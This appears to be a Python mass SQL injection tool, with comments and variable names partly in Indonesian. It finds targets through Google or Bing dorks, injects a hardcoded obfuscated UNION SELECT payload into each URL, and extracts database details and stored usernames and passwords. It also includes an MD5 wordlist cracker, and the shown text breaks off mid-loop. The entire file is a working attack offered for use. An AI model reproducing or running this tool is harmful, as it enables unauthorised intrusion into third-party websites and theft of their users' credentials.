try:    
    import sys
    import requests
    import re
    import bs4
    import time
    import hashlib

    User_Agent = { 'User-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' }
    payload = "'/*!50000UNION*/ /*!50000SELECT*/ /*!50000CONCAT*/(0x3c696e666f3e,database(),0x203a3a20,user(),0x203a3a20,@@port,0x203a3a20,@@version,0x3c2f696e666f3e3c6973693e,export_set(5,@:=0,(select+count(*)from(users)where@:=export_set(5,export_set(5,@,username,0x205b62617461735d5b756e616d655d20,2),password,0x205b706173735d20,2)),@,2),0x3c2f6973693e)+--+-"

    dork =""
    tipe =""
    def saiki():
       now = time.strftime(" [%H:%M:%S] ", time.localtime(time.time()))
       return now

    def dorking(dork,start, tipe):
        if tipe == "google":
            url = "https://google.co.id/search"
            data = { 'q' : dork, 'start' : start}
        else:
            url = "https://bing.com/search"
            data = { 'q' : dork, 'first' : start }

        try:
           s = requests.Session()
           r = s.get(url, params=data, headers=User_Agent)
           if 'Our systems have detected unusual traffic from your computer network' in r.text:
               print("\033[41m[CRITICAL]" + saiki() + "Systems have detected unusual traffic from your computer network !!\033[00m")
               con = input("Captcha detected. are you want continue? [Y/n] > ")
               if con.lower() == "n":
                   sys.exit()               
           return r.text
  
        except requests.exceptions.RequestException as e:
           print("\033[41m[CRITICAL]"+saiki()+"Request timed out, retrying to send process again..\033[00m")
          
    
    def bing(dork):
        first = 1
        text = ""
        for i in range(page):
            txt = dorking(dork, str(first), "bing")
            try:           
                text += txt
            except TypeError:
                attack(dork, tipe)    
            first += 10        
        site = re.findall( '<h2><a href="(.+?)"', text )
        return set(site)
     
    def google(dork):
        start = 0
        text = ""
        for i in range(page):
            txt = dorking(dork, str(start), "google")
            try:                           
                text += txt
            except TypeError:
                attack(dork, tipe)    
            start += 10        
        site = re.findall( '<h3 class="r"><a href="(.+?)"', text )
        return set(site)

    def hash(md5,wrdlst):
        f = open(wrdlst,'rb')
        fread = f.readlines()
        f.close()
        for pwd in fread:
            passw = pwd.decode().replace("\n", "")
            if hashlib.md5(passw.encode()).hexdigest() == md5:
                return passw
            else:
                return md5    

    def attack(dork_, tipe_):
        global dork
        global tipe
        dork = dork_
        tipe = tipe_
        if tipe == "google":
            site = google(dork)
        else:
            site = bing(dork)    
        panjang = len(site)    
        print("\033[32m[INFO]"+saiki()+"URL Finded: %s sites in dorker\033[00m\n " % panjang)
        print("\033[32m[INFO]" +saiki()+"Exploiting %s url was vuln\033[00m" % panjang)
        print("Please wait, this could take a few seconds/minutes as we checking url...")
        s = re.compile(r'(.*)/(.*)-(\d)-(.*)')
        for x in site:
            url = s.search(x)
            if url != None:
                domain, depan, num, mburi = url.group(1), url.group(2), url.group(3), url.group(4)
                def serang():
                    try:
                        r = requests.get(domain+"/"+depan+"-"+num+payload+"-"+mburi,headers=User_Agent)
                        return r.text
                    except requests.exceptions.RequestException as e:
                        print("\033[41m[CRITICAL]"+saiki()+"Request timed out, retrying to send process again..\033[00m")
                        r = requests.get(domain+"/"+depan+"-"+num+payload+"-"+mburi,headers=User_Agent)
                        return r.text
                        
                try:
                    tx = serang()
                except:
                    pass   
                if "<info>" in tx.lower():
                    sop = bs4.BeautifulSoup(tx, 'html.parser')
                    db, user, port, version = None, None, None, None
                    rx = re.compile(r'(.*) :: (.*) :: (.*) :: (.*)')
                    dt = rx.search(str(sop.title.info).replace("<info>","").replace("</info>",""))
                    db = None
                    try:
                        db, user, port, version = dt.group(1), dt.group(2), dt.group(3), dt.group(4)
                    except AttributeError:
                        pass 
                    if db != None:
                        print("""
+---------------------------+              
[*] Site     : %s
[*] Database : %s
[*] User     : %s
[*] Port     : %s
[*] Version  : %s
[*] Data     :""" % (domain,db,user,port,version))
                        cari = re.compile(r'\[uname\](.*?)\[pass\](.*)')
                        x =[]
                        for z in str(sop.title.isi).replace("</isi>","").replace("<isi>","").split('[batas]'):
                            try:
                                golek = cari.search(z)
                                x.append(golek)
                            except KeyboardInterrupt:
                                print()
                                print(saiki+"Shutting down..")
                                sys.exit()                               
                            except:
                                pass    

                        for v in x:
                            try:
                                uname = v
